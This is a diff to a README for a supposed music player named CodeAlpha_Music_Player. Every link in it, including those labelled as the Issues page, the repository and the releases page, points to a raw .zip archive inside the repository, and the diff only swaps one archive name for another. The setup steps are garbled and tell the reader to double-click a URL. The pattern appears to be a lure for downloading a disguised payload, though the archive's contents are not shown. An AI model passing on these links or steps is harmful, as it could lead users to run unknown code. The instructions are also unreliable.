@@ -1,6 +1,6 @@
 # 🎵 CodeAlpha_Music_Player - Listen to Your Favorite Tunes Smoothly
 
-[![Download CodeAlpha_Music_Player](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip)](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip)
+[![Download CodeAlpha_Music_Player](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip)](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip)
 
 ## 🌟 Overview
 
@@ -22,12 +22,12 @@ Before downloading, ensure your computer meets these basic requirements:
 
 To get started, visit the releases page for the latest version of CodeAlpha_Music_Player. Click the link below:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip)
 
 Once on the page, look for the latest release. Download the file suited for your operating system. 
 
 1. Click on the release name to open it.
-2. Find the download link, which typically ends in `.zip` or `https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip`.
+2. Find the download link, which typically ends in `.zip` or `https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip`.
 3. Click the link to download the file.
 
 After the download finishes, follow these steps to extract and run the application:
@@ -35,7 +35,7 @@ After the download finishes, follow these steps to extract and run the applicati
 1. Locate the downloaded file on your computer.
 2. Right-click the file and select “Extract All” or “Unzip.”
 3. Open the extracted folder.
-4. Double-click on `https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip` to open the music player in your web browser.
+4. Double-click on `https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip` to open the music player in your web browser.
 
 ## 🎶 Features
 
@@ -66,7 +66,7 @@ The application uses a variety of web technologies to function smoothly. Here ar
 
 If you have questions or need support, feel free to reach out to the community:
 
-- Join discussions on the [GitHub Issues page](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip).
+- Join discussions on the [GitHub Issues page](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip).
 - Explore the project files for more insights on how the player works.
 - Check out similar projects and get ideas for your own enhancements.
 
@@ -80,9 +80,9 @@ For advanced users who wish to customize the player:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip)
-- [Visit the Releases Page](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip)
 
-[![Download CodeAlpha_Music_Player](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip)](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/song/CodeAlpha_Music_Player-v3.6.zip) 
+[![Download CodeAlpha_Music_Player](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip)](https://raw.githubusercontent.com/Luminalament/CodeAlpha_Music_Player/main/js/Music-Player-Code-Alpha-3.2.zip) 
 
 Enjoy listening to your favorite music with CodeAlpha_Music_Player!
